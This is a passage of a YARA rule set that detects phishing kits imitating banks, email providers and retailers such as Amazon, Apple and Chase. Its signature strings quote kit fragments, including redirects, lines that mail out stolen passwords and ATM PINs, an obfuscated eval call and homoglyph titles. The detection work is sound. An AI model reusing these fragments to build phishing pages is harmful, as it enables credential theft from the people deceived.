    strings:
        $trigger = ">Alibaba&nbsp;Manufacturer"
    condition:
        $trigger and PR00042
}

private rule PR00287 : trigger
{
    strings:
        $ps0 = "<div style"
    condition:
        $ps0
}

rule html_phishing_alibaba_005 : phishing
{
    strings:
        $trigger = "&#38463;&#37324;&#24052;&#24052;&#29992;&#25143;&#21327;&#35758;"
    condition:
        $trigger and PR00287
}

private rule PR00288 : trigger
{
    strings:
        $ps0 = "moda.allegro"
    condition:
        $ps0
}

rule html_phishing_allegro_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00288 and PR00046
}

rule html_phishing_amazon_001 : phishing
{
    strings:
        $trigger = "<title>Amazon Billing Center"
    condition:
        $trigger
}

private rule PR00289 : trigger
{
    strings:
        $ps0 = "Amazon"
    condition:
        $ps0
}

rule html_phishing_amazon_002 : phishing
{
    strings:
        $trigger = "onsubmit=\"var test1 = apCheckRequiredFields('ap_signin_form', ['ap_email','ap_password']);"
    condition:
        $trigger and PR00289
}

rule html_phishing_amazon_003 : phishing
{
    strings:
        $trigger = "<div id=\"ap_signin1a_forgot_password_row\""
    condition:
        $trigger and PR00289
}

rule html_phishing_amazon_004 : phishing
{
    strings:
        $trigger = "<title>Amazon.com - Your Account</title>"
    condition:
        $trigger
}

private rule PR00290 : trigger
{
    strings:
        $ps0 = "href=\"https://www.amazon.com/gp/css/account/forgot-password/email.html"
    condition:
        $ps0
}

rule html_phishing_amazon_005 : phishing
{
    strings:
        $trigger = "Do you have an Amazon.com password?</b>"
    condition:
        $trigger and PR00290
}

rule html_phishing_amazon_006 : phishing
{
    strings:
        $trigger = "Please enter your Amazon Password"
    condition:
        $trigger
}

private rule PR00291 : trigger
{
    strings:
        $ps0 = "alert(\"Invalid Card number. Please check your entry.\")"
    condition:
        $ps0
}

rule html_phishing_amazon_006_02 : phishing
{
    strings:
        $trigger = "Amazon"
    condition:
        $trigger and PR00291
}

rule html_phishing_amazon_007 : phishing
{
    strings:
        $trigger = "Amazon.com Inc or its affiliates</span>"
    condition:
        $trigger
}

rule html_phishing_amazon_008 : phishing
{
    strings:
        $trigger = "<title>Amazon Sign ln</title>"
    condition:
        $trigger
}

private rule PR00292 : trigger
{
    strings:
        $ps0 = "HTTP-EQUIV=\"Refresh"
    condition:
        $ps0
}

rule html_phishing_amazon_009 : phishing
{
    strings:
        $trigger = "jtdeal.in"
    condition:
        $trigger and PR00042 and PR00292
}

rule html_phishing_amazon_010 : phishing
{
    strings:
        $trigger = "<title>FreakzBrothers: Amazon</title>"
    condition:
        $trigger and PR00281
}

rule html_phishing_amazon_011 : phishing
{
    strings:
        $trigger = "<title dir=\"ltr\">      Amazon"
    condition:
        $trigger
}

rule html_phishing_ameli_fr_001 : phishing
{
    strings:
        $trigger = "onclick='bookmarksite(\"Compte Ameli\",\"https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/"
    condition:
        $trigger and PR00042
}

private rule PR00293 : trigger
{
    strings:
        $ps0 = "http://happycdou.com/afters/grittier.js"
    condition:
        $ps0
}

rule html_phishing_americanexpress_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00293
}

private rule PR00294 : trigger
{
    strings:
        $ps0 = "American Express Credit Cards, Rewards"
    condition:
        $ps0
}

rule html_phishing_americanexpress_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00294
}

private rule PR00295 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"4;URL=http://www.americanexpress.com\" />"
    condition:
        $ps0
}

rule html_phishing_americanexpress_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00295
}

rule html_phishing_americanexpress_006 : phishing
{
    strings:
        $trigger = "document.location.href = '/americanexpress"
    condition:
        $trigger
}

private rule PR00296 : trigger
{
    strings:
        $ps0 = "<title>American Express US: Thank you"
    condition:
        $ps0
}

rule html_phishing_americanexpress_007 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00296
}

private rule PR00297 : trigger
{
    strings:
        $ps0 = "accesskey=\"0\" title=\"\" href=\"https://www.americanexpress.com/?inav=NavLogo"
    condition:
        $ps0
}

rule html_phishing_americanexpress_008 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00297
}

rule html_phishing_americanexpress_008_01 : phishing
{
    strings:
        $trigger = "header('location:'.$m.$i.'/z.html');"
    condition:
        $trigger
}

rule html_phishing_americanexpress_009 : phishing
{
    strings:
        $trigger = "<title>American Express Company"
    condition:
        $trigger
}

private rule PR00298 : trigger
{
    strings:
        $ps0 = "<title>American Express"
    condition:
        $ps0
}

rule html_phishing_americanexpress_010 : phishing
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00298
}

rule html_phishing_americanexpress_011 : phishing
{
    strings:
        $trigger = ">American Express - Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_americanexpress_012 : phishing
{
    strings:
        $trigger = "&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#110;&#32;&#69;&#120;&#112;&#114;&#101;&#115;&#115;"
    condition:
        $trigger and PR00042
}

rule html_phishing_americanexpress_013 : phishing
{
    strings:
        $trigger = "<title>American Express</title>"
    condition:
        $trigger
}

rule html_phishing_anz_001 : phishing
{
    strings:
        $trigger = "ANZ Internet Banking"
    condition:
        $trigger
}

rule html_phishing_aol_001 : phishing
{
    strings:
        $trigger = "<title>AOL Mail: Simple, Free, Fun</title>"
    condition:
        $trigger
}

rule html_phishing_aol_002 : phishing
{
    strings:
        $trigger = "<title>Aol Verefication"
    condition:
        $trigger
}

rule html_phishing_aol_003 : phishing
{
    strings:
        $trigger = "<title>A0L SIGN IN</title>"
    condition:
        $trigger
}

rule html_phishing_aol_004 : phishing
{
    strings:
        $trigger = "<title>AOL Sign In"
    condition:
        $trigger
}

rule html_phishing_aol_005 : phishing
{
    strings:
        $trigger = "<title>- AOL"
    condition:
        $trigger
}

private rule PR00299 : trigger
{
    strings:
        $ps0 = "<TITLE>Aol Billing Center"
    condition:
        $ps0
}

rule html_phishing_aol_006 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00299
}

rule html_phishing_aol_007 : phishing
{
    strings:
        $trigger = "<title>Welcome to AOL.com Customer Support"
    condition:
        $trigger
}

rule html_phishing_aol_008 : phishing
{
    strings:
        $trigger = "<title>_A0L"
    condition:
        $trigger
}

rule html_phishing_aol_009 : phishing
{
    strings:
        $trigger = "<title>AOL</title>"
    condition:
        $trigger
}

rule html_phishing_aol_010 : phishing
{
    strings:
        $trigger = "<title>AOL - login"
    condition:
        $trigger
}

rule html_phishing_aol_011 : phishing
{
    strings:
        $trigger = "<title>AOL Mail, AOL Mail Login, AOL Sign in"
    condition:
        $trigger
}

private rule PR00300 : trigger
{
    strings:
        $ps0 = "<title>Apple - M"
    condition:
        $ps0
}

rule html_phishing_apple_001_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00300
}

rule html_phishing_apple_001_002 : phishing
{
    strings:
        $trigger = "header(\"Location: restore.html?appId="
    condition:
        $trigger
}

rule html_phishing_apple_001_003 : phishing
{
    strings:
        $trigger = "header(\"Location: finish.html?appId="
    condition:
        $trigger
}

private rule PR00301 : trigger
{
    strings:
        $ps0 = "mail("
    condition:
        $ps0
}

rule html_phishing_apple_001_004 : phishing
{
    strings:
        $trigger = "$subj = \"Infos 3: $ip / $password\";"
    condition:
        $trigger and PR00301
}

private rule PR00302 : trigger
{
    strings:
        $ps0 = ">Your Apple ID gives you easy access to"
    condition:
        $ps0
}

rule html_phishing_apple_001_005 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00302
}

private rule PR00303 : trigger
{
    strings:
        $ps0 = "<title>Apple - Confirmation Your Account Information"
    condition:
        $ps0
}

rule html_phishing_apple_001_006 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00303
}

rule html_phishing_apple_001_007 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.apple.com"
    condition:
        $trigger
}

rule html_phishing_apple_001_008 : phishing
{
    strings:
        $trigger = "header(\"Location: sign_in.html?appId"
    condition:
        $trigger
}

rule html_phishing_apple_001_009 : phishing
{
    strings:
        $trigger = "header(\"Location: restore.php?appId="
    condition:
        $trigger
}

private rule PR00304 : trigger
{
    strings:
        $ps0 = "<title>Apple - Il mio ID Apple</title>"
    condition:
        $ps0
}

rule html_phishing_apple_001_010 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00304
}

private rule PR00305 : trigger
{
    strings:
        $ps0 = "<title>iTunes Connect"
    condition:
        $ps0
}

rule html_phishing_apple_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00305
}

private rule PR00306 : trigger
{
    strings:
        $ps0 = "<title>Secure internet shopping<"
    condition:
        $ps0
}

rule html_phishing_apple_002_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00306
}

rule html_phishing_apple_003 : phishing
{
    strings:
        $trigger = "\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x61\\x70\\x70\\x6C\\x65\\x69\\x64\\x2E\\x61\\x70\\x70\\x6C\\x65\\x2E\\x63\\x6F\\x6D\\x2F\\x67\\x6C\\x6F\\x62\\x61\\x6C\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x73\\x2F\\x6C\\x69\\x62\\x2F\\x70\\x72\\x6F\\x74\\x6F\\x74\\x79\\x70\\x65\\x2E\\x6A\\x73"
    condition:
        $trigger
}

private rule PR00307 : trigger
{
    strings:
        $ps0 = "<title>Apple - iTunes Clients"
    condition:
        $ps0
}

rule html_phishing_apple_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00307
}

rule html_phishing_apple_010 : phishing
{
    strings:
        $trigger = "<title> Apple Store :  </title>"
    condition:
        $trigger
}

rule html_phishing_apple_011 : phishing
{
    strings:
        $trigger = "<title>Verify Apple ID"
    condition:
        $trigger
}

private rule PR00308 : trigger
{
    strings:
        $ps0 = "&#65;p&#112;l&#101; Inc. All rights reserved.</a></div>"
    condition:
        $ps0
}

rule html_phishing_apple_012 : phishing
{
    strings:
        $trigger = "<p>The &#65;p&#112;l&#101; Online Store uses"
    condition:
        $trigger and PR00042 and PR00308
}

rule html_phishing_apple_013 : phishing
{
    strings:
        $trigger = "<title>Apple Id Email Validity"
    condition:
        $trigger
}

private rule PR00309 : trigger
{
    strings:
        $ps0 = "<a href=\"#\">Register</a> - <a href=\"#\">Forgot Password</a>"
    condition:
        $ps0
}

private rule PR00310 : trigger
{
    strings:
        $ps0 = "<h1>AppleConnect</h1>"
    condition:
        $ps0
}

rule html_phishing_apple_014 : phishing
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR00309 and PR00310
}

private rule PR00311 : trigger
{
    strings:
        $ps0 = "<title><?php echo $lang['TITLE1']; ?></title>"
    condition:
        $ps0
}

private rule PR00312 : trigger
{
    strings:
        $ps0 = ".php\">"
    condition:
        $ps0
}

rule html_phishing_apple_015 : phishing
{
    strings:
        $trigger = "Apple ID"
    condition:
        $trigger and PR00311 and PR00312
}

rule html_phishing_apple_016 : phishing
{
    strings:
        $trigger = "<title>Manage your Apple"
    condition:
        $trigger
}

rule html_phishing_apple_016_02 : phishing
{
    strings:
        $trigger = "<title>Sign in - Apple"
    condition:
        $trigger and PR00281
}

private rule PR00313 : trigger
{
    strings:
        $ps0 = "input placeholder=\"Apple ID\""
    condition:
        $ps0
}

rule html_phishing_apple_016_03 : phishing
{
    strings:
        $trigger = "document.getElementById(\"apple"
    condition:
        $trigger and PR00042 and PR00313
}

private rule PR00314 : trigger
{
    strings:
        $ps0 = "$denyIP"
    condition:
        $ps0
}

rule html_phishing_apple_017 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.apple.com\");"
    condition:
        $trigger and PR00092 and PR00314
}

private rule PR00315 : trigger
{
    strings:
        $ps0 = "Case ID : <b>[WFnumber]"
    condition:
        $ps0
}

rule html_phishing_apple_018 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00315
}

private rule PR00316 : trigger
{
    strings:
        $ps0 = "function Reletter($letter,$mailto){ $file = file_get_contents($letter);"
    condition:
        $ps0
}

rule html_phishing_apple_018_01 : phishing
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00316
}

rule html_phishing_apple_018_02 : phishing
{
    strings:
        $trigger = "goto TWOFISH; AES: eval($is($evil("
    condition:
        $trigger and PR00265
}

private rule PR00317 : trigger
{
    strings:
        $ps0 = "$subj"
    condition:
        $ps0
}

rule html_phishing_apple_018_03 : phishing
{
    strings:
        $trigger = "Learning Toolkit Using Latter GX40"
    condition:
        $trigger and PR00317
}

rule html_phishing_armex_001 : phishing
{
    strings:
        $trigger = ">Aramex Corporate<"
    condition:
        $trigger and PR00042
}

rule html_phishing_ATT_001 : phishing
{
    strings:
        $trigger = "AT&amp;T - DIRECTV, Wireless, Cell Phones, U-verse &amp; Internet"
    condition:
        $trigger and PR00042
}

rule html_phishing_ATT_002 : phishing
{
    strings:
        $trigger = ">myAT&amp;T Login - AT&amp;T Account Management, Pay Bill, Check Usage<"
    condition:
        $trigger and PR00042
}

rule html_phishing_ATT_003 : phishing
{
    strings:
        $trigger = "<title>AT&amp;T Security"
    condition:
        $trigger
}

private rule PR00318 : trigger
{
    strings:
        $ps0 = "decodeURIComponent"
    condition:
        $ps0
}

rule html_phishing_baidu_001 : phishing
{
    strings:
        $trigger = "url(#default#homepage)';var a = obj.setHomePage('//www.baidu.com"
    condition:
        $trigger and PR00029 and PR00318
}

private rule PR00319 : trigger
{
    strings:
        $ps0 = "Inicial - Banco do Brasil</title>"
    condition:
        $ps0
}

rule html_phishing_bancobrasil_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00319
}

rule html_phishing_bancobrasil_005 : phishing
{
    strings:
        $trigger = ">Smiles BB resgate seus pontos"
    condition:
        $trigger and PR00042
}

rule html_phishing_bancolombia_001 : phishing
{
    strings:
        $trigger = "<title>Sucursal Virtual BANCOLOMBIA</title>"
    condition:
        $trigger
}

rule html_phishing_bank_of_philippine_islands_001 : phishing
{
    strings:
        $trigger = "<title>Welcome to Bank of the Philippine"
    condition:
        $trigger
}

rule html_phishing_banking_001 : phishing
{
    strings:
        $trigger = "<title>Banca MPS"
    condition:
        $trigger
}

rule html_phishing_banking_001_02 : phishing
{
    strings:
        $trigger = "<title>Conti, Carte, Mutui, Investimenti e Risparmio |"
    condition:
        $trigger
}

rule html_phishing_banking_002 : phishing
{
    strings:
        $trigger = ">Step 1 of 3: Account Validation"
    condition:
        $trigger and PR00042
}

rule html_phishing_banking_003 : phishing
{
    strings:
        $trigger = "<title>KCDBank"
    condition:
        $trigger and PR00281
}

rule html_phishing_banking_004 : phishing
{
    strings:
        $trigger = "M&T Bank</title>"
    condition:
        $trigger and PR00042
}

private rule PR00320 : trigger
{
    strings:
        $ps0 = "<p>\xc2\xa9 AEON CREDIT"
    condition:
        $ps0
}

rule html_phishing_banking_005 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR00320
}

private rule PR00321 : trigger
{
    strings:
        $ps0 = "<span>Credit Card Number"
    condition:
        $ps0
}

rule html_phishing_banking_006 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR00321
}

private rule PR00322 : trigger
{
    strings:
        $ps0 = "function("
    condition:
        $ps0
}

private rule PR00323 : trigger
{
    strings:
        $ps0 = "document"
    condition:
        $ps0
}

rule html_phishing_banking_008 : phishing
{
    strings:
        $trigger = "<h2>Codice Utente</h2>"
    condition:
        $trigger and PR00322 and PR00050 and PR00323
}

rule html_phishing_banking_009 : phishing
{
    strings:
        $trigger = "<title>Banque et Assurances"
    condition:
        $trigger and PR00046
}

private rule PR00324 : trigger
{
    strings:
        $ps0 = "Credit Union</title>"
    condition:
        $ps0
}

rule html_phishing_banking_010 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00324 and PR00046
}

rule html_phishing_banking_011 : phishing
{
    strings:
        $trigger = "value=\"Online Banking\""
    condition:
        $trigger and PR00042 and PR00322 and PR00046 and PR00251
}

private rule PR00325 : trigger
{
    strings:
        $ps0 = "balance.vanillagift.com/favicon"
    condition:
        $ps0
}

rule html_phishing_banking_012 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR00325
}

private rule PR00326 : trigger
{
    strings:
        $ps0 = "issued by TBBK Card Services, Inc"
    condition:
        $ps0
}

rule html_phishing_banking_013 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00042 and PR00326
}

rule html_phishing_banking_014 : phishing
{
    strings:
        $trigger = "<title>Welcome to Online Banking"
    condition:
        $trigger
}

private rule PR00327 : trigger
{
    strings:
        $ps0 = "Canadian Western Bank</title>"
    condition:
        $ps0
}

rule html_phishing_banking_015 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00327 and PR00046
}

private rule PR00328 : trigger
{
    strings:
        $ps0 = "<title>Login - CWBdirect"
    condition:
        $ps0
}

rule html_phishing_banking_015_02 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00046 and PR00328
}

private rule PR00329 : trigger
{
    strings:
        $ps0 = "Online Banking</title>"
    condition:
        $ps0
}

rule html_phishing_banking_015_03 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00329 and PR00046
}

private rule PR00330 : trigger
{
    strings:
        $ps0 = "<title>CWB Card</title>"
    condition:
        $ps0
}

rule html_phishing_banking_015_04 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00046 and PR00330
}

rule html_phishing_bankofamerica_004 : phishing
{
    strings:
        $trigger = "$subject = \"BOA"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_005 : phishing
{
    strings:
        $trigger = "$header=\"https://www.bankofamerica.com\";"
    condition:
        $trigger and PR00042
}

private rule PR00331 : trigger
{
    strings:
        $ps0 = "; url=https://secure.bankofamerica.com/applynow"
    condition:
        $ps0
}

rule html_phishing_bankofamerica_007 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00331
}

rule html_phishing_bankofamerica_008 : phishing
{
    strings:
        $trigger = "<p>Bank of America"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_008_02 : phishing
{
    strings:
        $trigger = "<strong> Bank Of America Security Team</strong>"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_009 : phishing
{
    strings:
        $trigger = "<p>&Beta;ank of &Alpha;merica"
    condition:
        $trigger and PR00042
}

private rule PR00332 : trigger
{
    strings:
        $ps0 = "var _"
    condition:
        $ps0
}

rule html_phishing_bankofamerica_010 : phishing
{
    strings:
        $trigger = "\\x61\\x6E\\x6B\\x20\\x6F\\x66\\x20\\x41\\x6D\\x65\\x72\\x69\\x63\\x61"
    condition:
        $trigger and PR00332
}

rule html_phishing_bankofamerica_011 : phishing
{
    strings:
        $trigger = "<title>\xce\x92ank of \xce\x91merica"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_011_02 : phishing
{
    strings:
        $trigger = "<title>\xce\x92\xd0\xb0nk \xd0\xbef \xce\x91m\xd0\xb5r\xd1\x96\xd1\x81\xd0\xb0"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_012 : phishing
{
    strings:
        $trigger = "<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_013 : phishing
{
    strings:
        $trigger = "<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;"
    condition:
        $trigger
}

rule html_phishing_bankofamerica_014 : phishing
{
    strings:
        $trigger = "<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;"
    condition:
        $trigger
}

rule html_phishing_bankofireland365_001 : phishing
{
    strings:
        $trigger = "<title>Bank of Ireland 365 Online | "
    condition:
        $trigger
}

rule html_phishing_banque_populaire_001 : phishing
{
    strings:
        $trigger = "alert (\"Veuillez confirmer votre PassCyberplus avant de continuer\")"
    condition:
        $trigger and PR00247
}

private rule PR00333 : trigger
{
    strings:
        $ps0 = "Battle.net Account Login"
    condition:
        $ps0
}

rule html_phishing_battle_net_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00333
}

rule html_phishing_bbt_001 : phishing
{
    strings:
        $trigger = "<title>BB&T - ACCOUNT VERIFICATION"
    condition:
        $trigger
}

private rule PR00334 : trigger
{
    strings:
        $ps0 = "<title>Online Banking"
    condition:
        $ps0
}

rule html_phishing_bbt_001_02 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR00334
}

rule html_phishing_bbva_001 : phishing
{
    strings:
        $trigger = "<title>Personas | BBVA Continental</title>"
    condition:
        $trigger
}

rule html_phishing_bbva_002 : phishing
{
    strings:
        $trigger = "<title>Contrataci\xc3\xb3n del servicio en l\xc3\xadnea"
    condition:
        $trigger
}

rule html_phishing_bbva_003 : phishing
{
    strings:
        $trigger = "<title>Registro | BBVA Bancomer"
    condition:
        $trigger
}

rule html_phishing_bbva_004 : phishing
{
    strings:
        $trigger = "<title>BBVAnet"
    condition:
        $trigger
}

rule html_phishing_bbva_004_02 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.bbva.com.co/\")"
    condition:
        $trigger
}

rule html_phishing_biglobe_001 : phishing
{
    strings:
        $trigger = "<title>BIGLOBE"
    condition:
        $trigger
}

private rule PR00335 : trigger
{
    strings:
        $ps0 = "auth.sso.biglobe.ne.jp"
    condition:
        $ps0
}

private rule PR00336 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh"
    condition:
        $ps0
}

rule html_phishing_biglobe_002 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR00042 and PR00335 and PR00336
}

private rule PR00337 : trigger
{
    strings:
        $ps0 = "<title>BME HSZK"
    condition:
        $ps0
}

rule html_phishing_bme_hszk_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR00337
}

// MANUAL FIX NECESSARY
rule html_phishing_bmo_001 : phishing
{
    strings:
        $trigger = "Bank"
        $html_phishing_bmo_001_r0 = /<title>\s*(\w+\s*)?Bank\s*of\s*Montreal/
    condition:
        $trigger and $html_phishing_bmo_001_r0
}

rule html_phishing_bmo_002 : phishing
{
    strings:
        $trigger = "<title>Sign in - BMO<"
    condition:
        $trigger
}

rule html_phishing_box_001 : phishing
{
    strings:
        $trigger = "<title>(1) New File | Secure File Sharing"
    condition:
        $trigger
}

rule html_phishing_box_002 : phishing
{
    strings:
        $trigger = "<title>Secure File Sharing, Storage and Collaboration | Box"
    condition:
        $trigger
}

rule html_phishing_bradesco_001 : phishing
{
    strings:
        $trigger = "<title>Banco Bradesco|Pessoa"
    condition:
        $trigger
}

rule html_phishing_bradesco_001_001 : phishing
{
    strings:
        $trigger = "ica,Exclusive,Prime e Private</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_bradesco_002 : phishing
{
    strings:
        $trigger = "Atendimento 24 horas, Banco Bradesco S.A. CNPJ 60.746.948/0001-12.</div></td>"
    condition:
        $trigger and PR00042
}

private rule PR00338 : trigger
{
    strings:
        $ps0 = "<title>Bradesco"
    condition:
        $ps0
}

rule html_phishing_bradesco_003 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00338
}

rule html_phishing_bradesco_004 : phishing
{
    strings:
        $trigger = "Banco Bradesco SA"
    condition:
        $trigger and PR00042
}

private rule PR00339 : trigger
{
    strings:
        $ps0 = "bt.com"
    condition:
        $ps0
}

rule html_phishing_bt_001 : phishing
{
    strings:
        $trigger = "<title>Change payment details | Your Account | BT.com</title>"
    condition:
        $trigger and PR00339
}

rule html_phishing_bt_002 : phishing
{
    strings:
        $trigger = "<title>Email Login Page"
    condition:
        $trigger and PR00339
}

rule html_phishing_bt_002_02 : phishing
{
    strings:
        $trigger = "<title>Your Profile"
    condition:
        $trigger and PR00339
}

private rule PR00340 : trigger
{
    strings:
        $ps0 = ".bt.com"
    condition:
        $ps0
}

private rule PR00341 : trigger
{
    strings:
        $ps0 = "curl_init("
    condition:
        $ps0
}

private rule PR00342 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL"
    condition:
        $ps0
}

rule html_phishing_bt_002_03 : phishing
{
    strings:
        $trigger = "$email = base64_decode($query);"
    condition:
        $trigger and PR00091 and PR00340 and PR00341 and PR00342
}

rule html_phishing_caixabank_001 : phishing
{
    strings:
        $trigger = "<title>CaixaBank"
    condition:
        $trigger
}

private rule PR00343 : trigger
{
    strings:
        $ps0 = "; url=https://www.capitalone.com"
    condition:
        $ps0
}

rule html_phishing_capitalone_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00343
}

rule html_phishing_capitalone_002 : phishing
{
    strings:
        $trigger = "<title>Capital One Login, Capital One Credit Card Login,"
    condition:
        $trigger
}

rule html_phishing_capitec_001 : phishing
{
    strings:
        $trigger = "<title>Capitec Internet Banking"
    condition:
        $trigger and PR00281
}

rule html_phishing_centurylink_001 : phishing
{
    strings:
        $trigger = "<link rel=\"shortcut icon\" href=\"https://www.centurylink.com/favicon.ico\" type=\"image/vnd.microsoft.icon\" >"
    condition:
        $trigger and PR00042
}

rule html_phishing_chase_001 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.chase.com/"
    condition:
        $trigger
}

rule html_phishing_chase_001_002 : phishing
{
    strings:
        $trigger = "<title>Chase Personal Banking Investment"
    condition:
        $trigger
}

private rule PR00344 : trigger
{
    strings:
        $ps0 = "<title>Chase Online"
    condition:
        $ps0
}

rule html_phishing_chase_001_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00344
}

rule html_phishing_chase_001_004 : phishing
{
    strings:
        $trigger = "$message .= \"ATM Pin: \"."
    condition:
        $trigger
}

rule html_phishing_chase_001_005 : phishing
{
    strings:
        $trigger = "header(\"Location: http://chase.com\");"
    condition:
        $trigger
}

rule html_phishing_chase_001_007 : phishing
{
    strings:
        $trigger = "<title>CHASE Home: Personal Banking"
    condition:
        $trigger
}

rule html_phishing_chase_001_08 : phishing
{
    strings:
        $trigger = "Chase Online - Done !<"
    condition:
        $trigger and PR00042
}

private rule PR00345 : trigger
{
    strings:
        $ps0 = "Chase Online -"
    condition:
        $ps0
}

rule html_phishing_chase_001_09 : phishing
{
    strings:
        $trigger = "Account"
    condition:
        $trigger and PR00042 and PR00345
}

rule html_phishing_chase_002 : phishing
{
    strings:
        $trigger = "information - chase</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_chase_002_02 : phishing
{
    strings:
        $trigger = "chase.com</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_chase_003 : phishing
{
    strings:
        $trigger = "<title>Chase Bank"
    condition:
        $trigger
}

private rule PR00346 : trigger
{
    strings:
        $ps0 = ">Chase Personal"
    condition:
        $ps0
}

rule html_phishing_chase_004 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00346
}

rule html_phishing_chase_005 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.chase.com"
    condition:
        $trigger
}

private rule PR00347 : trigger
{
    strings:
        $ps0 = "JPMorgan Chase"
    condition:
        $ps0
}

rule html_phishing_chase_006 : phishing
{
    strings:
        $trigger = "chase.com"
    condition:
        $trigger and PR00042 and PR00347
}

rule html_phishing_chase_007 : phishing
{
    strings:
        $trigger = "<title>Thank you! - Account Verification </title>"
    condition:
        $trigger
}

private rule PR00348 : trigger
{
    strings:
        $ps0 = "location"
    condition:
        $ps0
}

rule html_phishing_checkout_001 : phishing
{
    strings:
        $trigger = "http://cwcargo.com/Checkout\"</script>"
    condition:
        $trigger and PR00323 and PR00348
}

rule html_phishing_chinese_001 : phishing
{
    strings:
        $trigger = "%3c%74%69%74%6c%65%3e%26%23%33%37%30%33%38%3b%26%23%32%30%32%31%34%3b%26%23%33%35%37%37%34%3b%26%23%33%32%36%32%32%3b%20%7c%20%26%23%33%30%30%30%35%3b%26%23%32%33%33%37%36%3b%26%23%33%37%30%33%38%3b%26%23%32%30%32%31%34%3b%26%23%32%31%33%31%39%3b%26%23%33%32%34%32%33%3b%3c%2f%74"
    condition:
        $trigger and PR00231
}

rule html_phishing_chinese_002 : phishing
{
    strings:
        $trigger = "<title>&#37038;&#20214;&#35774;&#32622; | &#30005;&#23376;&#37038;&#20214;&#21319;&#32423;</title>"
    condition:
        $trigger
}

private rule PR00349 : trigger
{
    strings:
        $ps0 = "<form method=\"post\" action=\"post.php\">"
    condition:
        $ps0
}

rule html_phishing_chinese_003 : phishing
{
    strings:
        $trigger = "<title>Mail Settings | Email Upgrade</title>"
    condition:
        $trigger and PR00349
}

private rule PR00350 : trigger
{
    strings:
        $ps0 = "splashmessage[0]='Verifying your mailbox'"
    condition:
        $ps0
}

rule html_phishing_chinese_004 : phishing
{
    strings:
        $trigger = "<title>Mail Settings | Email Upgrade</title>"
    condition:
        $trigger and PR00350
}

rule html_phishing_chinese_005 : phishing
{
    strings:
        $trigger = "<title>&#32593;&#26131;VIP163"
    condition:
        $trigger
}

rule html_phishing_chinese_006 : phishing
{
    strings:
        $trigger = "<title>\xe9\xaa\x8c\xe8\xaf\x81\xe6\x88\x90\xe5\x8a\x9f"
    condition:
        $trigger
}

rule html_phishing_cielo_001 : phishing
{
    strings:
